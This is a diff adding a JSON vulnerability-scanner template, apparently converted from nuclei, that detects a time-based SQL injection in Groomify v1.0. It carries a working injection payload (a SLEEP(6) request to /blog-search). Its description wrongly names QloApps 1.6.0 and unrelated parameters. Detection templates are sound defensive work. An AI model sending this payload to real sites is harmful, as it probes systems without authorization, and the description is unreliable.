@@ -1,0 +1,123 @@
+{
+  "id": "groomify-sqli",
+  "name": "Groomify v1.0 - SQL Injection Vulnerability",
+  "author": "theamanrawat",
+  "severity": "HIGH",
+  "description": "An unauthenticated Time-Based SQL injection found in Webkul QloApps 1.6.0 via GET parameter date_from, date_to, and id_product allows a remote attacker to bypass a web application\u0027s authentication and authorization mechanisms and retrieve the contents of an entire database.\n",
+  "references": [
+    "https://codecanyon.net/item/groomify-barbershop-salon-spa-booking-and-ecommerce-platform/45808114#",
+    "https://vulners.com/zdt/1337DAY-ID-38799"
+  ],
+  "tags": [
+    "time-based-sqli",
+    "sqli",
+    "groomify",
+    "unauth"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout: 25s\nGET /blog-search?search\u003ddeneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27\u003d%27rszk HTTP/2\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d6",
+            "status_code \u003d\u003d 200",
+            "contains(header, \"text/html\")",
+            "contains(body, \u0027value\u003d\\\"deneme\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "groomify-sqli",
+    "info": {
+      "name": "Groomify v1.0 - SQL Injection Vulnerability",
+      "author": "theamanrawat",
+      "severity": "high",
+      "description": "An unauthenticated Time-Based SQL injection found in Webkul QloApps 1.6.0 via GET parameter date_from, date_to, and id_product allows a remote attacker to bypass a web application\u0027s authentication and authorization mechanisms and retrieve the contents of an entire database.\n",
+      "reference": [
+        "https://codecanyon.net/item/groomify-barbershop-salon-spa-booking-and-ecommerce-platform/45808114#",
+        "https://vulners.com/zdt/1337DAY-ID-38799"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "time-based-sqli,sqli,groomify,unauth"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout: 25s\nGET /blog-search?search\u003ddeneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27\u003d%27rszk HTTP/2\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d6",
+              "status_code \u003d\u003d 200",
+              "contains(header, \"text/html\")",
+              "contains(body, \u0027value\u003d\\\"deneme\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
